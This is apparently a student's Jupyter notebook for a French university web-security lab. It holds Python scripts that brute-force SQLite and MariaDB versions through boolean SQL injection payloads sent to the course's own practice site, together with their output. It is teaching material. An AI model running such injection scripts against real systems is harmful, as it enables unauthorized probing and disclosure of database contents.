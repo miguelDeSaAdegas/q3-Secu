{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# ipl I317B Sécurité : labos\n",
    "## Semaine 4 : Vulnérabilitées web (2)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 1:\n",
    "Revenons un peux en arrière sur le site de notre mauvais développeur. Nous savons que le site utilise sqlite comme système de gestion de base de donnée mais nous aimerions en identifier la version. Utilisez le site de l'exercice 1 pour récupérer cette information.\n",
    "\n",
    "https://labosecuipl.alwaysdata.net/23/s02/ex1a/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "version 3.44.0 non correspondante\n",
      "version 3.43.2 non correspondante\n",
      "version 3.43.1 non correspondante\n",
      "version 3.43.0 non correspondante\n",
      "version 3.42.0 non correspondante\n",
      "version 3.41.2 non correspondante\n",
      "version 3.41.1 non correspondante\n",
      "version 3.41.0 non correspondante\n",
      "version 3.40.1 non correspondante\n",
      "version 3.40.0 non correspondante\n",
      "version 3.39.4 non correspondante\n",
      "version 3.39.3 non correspondante\n",
      "version 3.39.2 non correspondante\n",
      "version 3.39.1 non correspondante\n",
      "version 3.39.0 non correspondante\n",
      "version 3.38.5 non correspondante\n",
      "version 3.38.4 non correspondante\n",
      "version 3.38.3 non correspondante\n",
      "version 3.38.2 non correspondante\n",
      "version 3.38.1 non correspondante\n",
      "version 3.38.0 non correspondante\n",
      "version 3.37.2 non correspondante\n",
      "version 3.37.1 non correspondante\n",
      "version 3.37.0 non correspondante\n",
      "version 3.36.0 non correspondante\n",
      "version 3.35.5 non correspondante\n",
      "version 3.35.4 non correspondante\n",
      "version 3.35.3 non correspondante\n",
      "version 3.35.2 non correspondante\n",
      "version 3.35.1 non correspondante\n",
      "version 3.35.0 non correspondante\n",
      "version 3.34.1 non correspondante\n",
      "version 3.34.0 non correspondante\n",
      "version 3.33.0 non correspondante\n",
      "version 3.32.3 non correspondante\n",
      "version 3.32.2 non correspondante\n",
      "version 3.32.1 non correspondante\n",
      "version 3.32.0 non correspondante\n",
      "version 3.31.1 non correspondante\n",
      "version 3.31.0 non correspondante\n",
      "version 3.30.1 non correspondante\n",
      "version 3.30.0 non correspondante\n",
      "version 3.29.0 non correspondante\n",
      "version 3.28.0 non correspondante\n",
      "SQLITE verison : 3.27.2\n"
     ]
    }
   ],
   "source": [
    "#TODO\n",
    "import requests\n",
    "from bs4 import BeautifulSoup\n",
    "\n",
    "session = requests.Session()\n",
    "\n",
    "pageVersion = requests.get(\"https://www.sqlite.org/chronology.html\")\n",
    "soupVersion = BeautifulSoup(pageVersion.text)\n",
    "    \n",
    "all_versions = []\n",
    "for tr in soupVersion.find_all(\"tr\")[1:]:\n",
    "    all_versions.append(tr.find_all('td')[1].text)\n",
    "\n",
    "html = session.get(\"http://labosecuipl.alwaysdata.net/23/s02/ex1a/\")\n",
    "\n",
    "soup = BeautifulSoup(html.text)\n",
    "\n",
    "for version in all_versions:    \n",
    "    page = requests.post(\n",
    "        \"http://labosecuipl.alwaysdata.net/23/s02/ex1a/\",\n",
    "        data={ \n",
    "            \"login\": \"\\\" or sqlite_version()='\" + version + \"';--\",\n",
    "            \"password\": \"\"\n",
    "        })\n",
    "    if \"Good job\" in page.text:\n",
    "        print(\"SQLITE verison : \" + version)\n",
    "        break\n",
    "    else:\n",
    "        print(\"version \" + version + \" non correspondante\")\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exercice 2:\n",
    "Pour ce dernier exercice, vous allez travailler un peu à l'aveugle. En effet, la page suicitant notre intérêt cette fois-ci ne contient pas grand chose à part à un bouton ... mais elle est injectable (promis) !\n",
    "\n",
    "À vous de trouvez comment et de récupérer la version du système de gestion de base de donnée : https://labosecuipl.alwaysdata.net/23/s04/ex2/\n",
    "\n",
    "Tips:\n",
    "  - Cette fois-ci, c'est plus du sqlite : https://mariadb.com/kb/en/version/\n",
    "  - Et vous travaillez à l'aveugle ;-)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['11.3.0-MariaDB', '11.2.1-MariaDB', '11.2.0-MariaDB', '11.1.2-MariaDB', '11.1.1-MariaDB', '11.1.0-MariaDB', '11.0.3-MariaDB', '11.0.2-MariaDB', '11.0.1-MariaDB', '11.0.0-MariaDB', '10.11.5-MariaDB', '10.11.4-MariaDB', '10.11.3-MariaDB', '10.11.2-MariaDB', '10.11.1-MariaDB', '10.11.0-MariaDB', '10.10.6-MariaDB', '10.10.5-MariaDB', '10.10.4-MariaDB', '10.10.3-MariaDB', '10.10.2-MariaDB', '10.10.1-MariaDB', '10.10.0-MariaDB', '10.9.8-MariaDB', '10.9.7-MariaDB', '10.9.6-MariaDB', '10.9.5-MariaDB', '10.9.4-MariaDB', '10.9.3-MariaDB', '10.9.2-MariaDB', '10.9.1-MariaDB', '10.9.0-MariaDB', '10.8.8-MariaDB', '10.8.7-MariaDB', '10.8.6-MariaDB', '10.8.5-MariaDB', '10.8.4-MariaDB', '10.8.3-MariaDB', '10.8.2-MariaDB', '10.8.0-MariaDB', '10.7.8-MariaDB', '10.7.7-MariaDB', '10.7.6-MariaDB', '10.7.5-MariaDB', '10.7.4-MariaDB', '10.7.3-MariaDB', '10.7.1-MariaDB', '10.7.0-MariaDB', '10.6.15-MariaDB', '10.6.14-MariaDB', '10.6.13-MariaDB', '10.6.12-MariaDB', '10.6.11-MariaDB', '10.6.10-MariaDB', '10.6.9-MariaDB', '10.6.8-MariaDB', '10.6.7-MariaDB', '10.6.5-MariaDB', '10.6.4-MariaDB', '10.6.3-MariaDB', '10.6.2-MariaDB', '10.6.1-MariaDB', '10.6.0-MariaDB', '10.5.22-MariaDB', '10.5.21-MariaDB', '10.5.20-MariaDB', '10.5.19-MariaDB', '10.5.18-MariaDB', '10.5.17-MariaDB', '10.5.16-MariaDB', '10.5.15-MariaDB', '10.5.13-MariaDB', '10.5.12-MariaDB', '10.5.11-MariaDB', '10.5.10-MariaDB', '10.5.9-MariaDB', '10.5.8-MariaDB', '10.5.7-MariaDB', '10.5.6-MariaDB', '10.5.5-MariaDB', '10.5.4-MariaDB', '10.5.3-MariaDB', '10.5.2-MariaDB', '10.5.1-MariaDB', '10.5.0-MariaDB', '10.4.31-MariaDB', '10.4.30-MariaDB', '10.4.29-MariaDB', '10.4.28-MariaDB', '10.4.27-MariaDB', '10.4.26-MariaDB', '10.4.25-MariaDB', '10.4.24-MariaDB', '10.4.22-MariaDB', '10.4.21-MariaDB', '10.4.20-MariaDB', '10.4.19-MariaDB', '10.4.18-MariaDB', '10.4.17-MariaDB', '10.4.16-MariaDB', '10.4.15-MariaDB', '10.4.14-MariaDB', '10.4.13-MariaDB', '10.4.12-MariaDB', '10.4.11-MariaDB', '10.4.10-MariaDB', '10.4.8-MariaDB', '10.4.7-MariaDB', '10.4.6-MariaDB', '10.4.5-MariaDB', '10.4.4-MariaDB', '10.4.3-MariaDB', '10.4.2-MariaDB', '10.4.1-MariaDB', '10.4.0-MariaDB', '10.3.39-MariaDB', '10.3.38-MariaDB', '10.3.37-MariaDB', '10.3.36-MariaDB', '10.3.35-MariaDB', '10.3.34-MariaDB', '10.3.32-MariaDB', '10.3.31-MariaDB', '10.3.30-MariaDB', '10.3.29-MariaDB', '10.3.28-MariaDB', '10.3.27-MariaDB', '10.3.26-MariaDB', '10.3.25-MariaDB', '10.3.24-MariaDB', '10.3.23-MariaDB', '10.3.22-MariaDB', '10.3.21-MariaDB', '10.3.20-MariaDB', '10.3.18-MariaDB', '10.3.17-MariaDB', '10.3.16-MariaDB', '10.3.15-MariaDB', '10.3.14-MariaDB', '10.3.13-MariaDB', '10.3.12-MariaDB', '10.3.11-MariaDB', '10.3.10-MariaDB', '10.3.9-MariaDB', '10.3.8-MariaDB', '10.3.7-MariaDB', '10.3.6-MariaDB', '10.3.5-MariaDB', '10.3.4-MariaDB', '10.3.3-MariaDB', '10.3.2-MariaDB', '10.3.1-MariaDB', '10.3.0-MariaDB', '10.2.44-MariaDB', '10.2.43-MariaDB', '10.2.41-MariaDB', '10.2.40-MariaDB', '10.2.39-MariaDB', '10.2.38-MariaDB', '10.2.37-MariaDB', '10.2.36-MariaDB', '10.2.35-MariaDB', '10.2.34-MariaDB', '10.2.33-MariaDB', '10.2.32-MariaDB', '10.2.31-MariaDB', '10.2.30-MariaDB', '10.2.29-MariaDB', '10.2.27-MariaDB', '10.2.26-MariaDB', '10.2.25-MariaDB', '10.2.24-MariaDB', '10.2.23-MariaDB', '10.2.22-MariaDB', '10.2.21-MariaDB', '10.2.20-MariaDB', '10.2.19-MariaDB', '10.2.18-MariaDB', '10.2.17-MariaDB', '10.2.16-MariaDB', '10.2.15-MariaDB', '10.2.14-MariaDB', '10.2.13-MariaDB', '10.2.12-MariaDB', '10.2.11-MariaDB', '10.2.10-MariaDB', '10.2.9-MariaDB', '10.2.8-MariaDB', '10.2.7-MariaDB', '10.2.6-MariaDB', '10.2.5-MariaDB', '10.2.4-MariaDB', '10.2.3-MariaDB', '10.2.2-MariaDB', '10.2.1-MariaDB', '10.2.0-MariaDB', '10.1.48-MariaDB', '10.1.47-MariaDB', '10.1.46-MariaDB', '10.1.45-MariaDB', '10.1.44-MariaDB', '10.1.43-MariaDB', '10.1.41-MariaDB', '10.1.40-MariaDB', '10.1.39-MariaDB', '10.1.38-MariaDB', '10.1.37-MariaDB', '10.1.36-MariaDB', '10.1.35-MariaDB', '10.1.34-MariaDB', '10.1.33-MariaDB', '10.1.32-MariaDB', '10.1.31-MariaDB', '10.1.30-MariaDB', '10.1.29-MariaDB', '10.1.28-MariaDB', '10.1.26-MariaDB', '10.1.25-MariaDB', '10.1.24-MariaDB', '10.1.23-MariaDB', '10.1.22-MariaDB', '10.1.21-MariaDB', '10.1.20-MariaDB', '10.1.19-MariaDB', '10.1.18-MariaDB', '10.1.17-MariaDB', '10.1.16-MariaDB', '10.1.14-MariaDB', '10.1.13-MariaDB', '10.1.12-MariaDB', '10.1.11-MariaDB', '10.1.10-MariaDB', '10.1.9-MariaDB', '10.1.8-MariaDB', '10.1.7-MariaDB', '10.1.6-MariaDB', '10.1.5-MariaDB', '10.1.4-MariaDB', '10.1.3-MariaDB', '10.1.2-MariaDB', '10.1.1-MariaDB', '10.1.0-MariaDB', '10.0.38-MariaDB', '10.0.37-MariaDB', '10.0.36-MariaDB', '10.0.35-MariaDB', '10.0.34-MariaDB', '10.0.33-MariaDB', '10.0.32-MariaDB', '10.0.31-MariaDB', '10.0.30-MariaDB', '10.0.29-MariaDB', '10.0.28-MariaDB', '10.0.27-MariaDB', '10.0.26-MariaDB', '10.0.25-MariaDB', '10.0.24-MariaDB', '10.0.23-MariaDB', '10.0.22-MariaDB', '10.0.21-MariaDB', '10.0.20-MariaDB', '10.0.19-MariaDB', '10.0.18-MariaDB', '10.0.17-MariaDB', '10.0.16-MariaDB', '10.0.15-MariaDB', '10.0.14-MariaDB', '10.0.13-MariaDB', '10.0.12-MariaDB', '10.0.11-MariaDB', '10.0.10-MariaDB', '10.0.9-MariaDB', '10.0.8-MariaDB', '10.0.7-MariaDB', '10.0.6-MariaDB', '10.0.5-MariaDB', '10.0.4-MariaDB', '10.0.3-MariaDB', '10.0.2-MariaDB', '10.0.1-MariaDB', '10.0.0-MariaDB', '5.5.68-MariaDB', '5.5.67-MariaDB', '5.5.66-MariaDB', '5.5.65-MariaDB', '5.5.64-MariaDB', '5.5.63-MariaDB', '5.5.62-MariaDB', '5.5.61-MariaDB', '5.5.60-MariaDB', '5.5.59-MariaDB', '5.5.58-MariaDB', '5.5.57-MariaDB', '5.5.56-MariaDB', '5.5.55-MariaDB', '5.5.54-MariaDB', '5.5.53-MariaDB', '5.5.52-MariaDB', '5.5.51-MariaDB', '5.5.50-MariaDB', '5.5.49-MariaDB', '5.5.48-MariaDB', '5.5.47-MariaDB', '5.5.46-MariaDB', '5.5.45-MariaDB', '5.5.44-MariaDB', '5.5.43-MariaDB', '5.5.42-MariaDB', '5.5.41-MariaDB', '5.5.40-MariaDB', '5.5.39-MariaDB', '5.5.38-MariaDB', '5.5.37-MariaDB', '5.5.36-MariaDB', '5.5.35-MariaDB', '5.5.34-MariaDB', '5.5.33-MariaDB', '5.5.33a-MariaDB', '5.5.32-MariaDB', '5.5.31-MariaDB', '5.5.30-MariaDB', '5.5.29-MariaDB', '5.5.28-MariaDB', '5.5.28a-MariaDB', '5.5.27-MariaDB', '5.5.25-MariaDB', '5.5.24-MariaDB', '5.5.23-MariaDB', '5.5.22-MariaDB', '5.5.21-MariaDB', '5.5.20-MariaDB', '5.3.12-MariaDB', '5.3.11-MariaDB', '5.3.10-MariaDB', '5.3.9-MariaDB', '5.3.8-MariaDB', '5.3.7-MariaDB', '5.3.6-MariaDB', '5.3.5-MariaDB', '5.3.4-MariaDB', '5.3.3-MariaDB', '5.3.2-MariaDB', '5.3.1-MariaDB', '5.3.0-MariaDB', '5.2.14-MariaDB', '5.2.13-MariaDB', '5.2.12-MariaDB', '5.2.11-MariaDB', '5.2.10-MariaDB', '5.2.9-MariaDB', '5.2.8-MariaDB', '5.2.7-MariaDB', '5.2.6-MariaDB', '5.2.5-MariaDB', '5.2.4-MariaDB', '5.2.3-MariaDB', '5.2.2-MariaDB', '5.2.1-MariaDB', '5.2.0-MariaDB', '5.1.67-MariaDB', '5.1.66-MariaDB', '5.1.62-MariaDB', '5.1.61-MariaDB', '5.1.60-MariaDB', '5.1.55-MariaDB', '5.1.53-MariaDB', '5.1.51-MariaDB', '5.1.50-MariaDB', '5.1.49-MariaDB', '5.1.47-MariaDB', '5.1.44-MariaDB', '5.1.42-MariaDB', '5.1.41-MariaDB']\n",
      "<!DOCTYPE html>\n",
      "<html lang=\"en\">\n",
      "<head>\n",
      "<style>\n",
      ".rainbow-text {\n",
      "  background-image: linear-gradient(to left, violet, indigo, blue, green, yellow, orange, red);\n",
      "  -webkit-background-clip: text;\n",
      "  color: transparent;\n",
      "}\n",
      "</style>\n",
      "</head>\n",
      "\n",
      "<h2><span class='rainbow-text'>Press the magic button !</span></h2>\n",
      "<form action='.' method='POST'>\n",
      "  <input type='hidden' name='id' value='2'><br>\n",
      "  <input type='submit' value='Submit'>\n",
      "</form>\n",
      "</html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "#TODO\n",
    "import requests\n",
    "from bs4 import BeautifulSoup\n",
    "\n",
    "session = requests.Session()\n",
    "\n",
    "reqVersion = requests.get(\"https://mariadb.org/mariadb/all-releases/\")\n",
    "soupVersion = BeautifulSoup(reqVersion.text)\n",
    "    \n",
    "all_versions = []\n",
    "    \n",
    "def download_href(href):\n",
    "    return href and href.startswith(\"https://mariadb.org/download/\")\n",
    "    \n",
    "for version in soupVersion.find(\"div\", {\"class\": \"entry-content\"}).find_all(\"a\", href=download_href):\n",
    "    all_versions.append(version.text + \"-MariaDB\")\n",
    "\n",
    "html = session.get(\"http://labosecuipl.alwaysdata.net/23/s04/ex2/\")\n",
    "\n",
    "soup = BeautifulSoup(html.text)\n",
    "\n",
    "for version in all_versions:    \n",
    "    page = requests.post(\n",
    "        \"http://labosecuipl.alwaysdata.net/23/s04/ex2/\",\n",
    "        data={ \n",
    "            \"id\": \"\\\" or VERSION()='\" + version + \"';--\",\n",
    "        })\n",
    "\n",
    "    if \"Good job\" in page.text:\n",
    "        print(\"SQLITE verison : \" + version)\n",
    "        break\n",
    "    else:\n",
    "        print(\"version \" + version + \" non correspondante\")\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
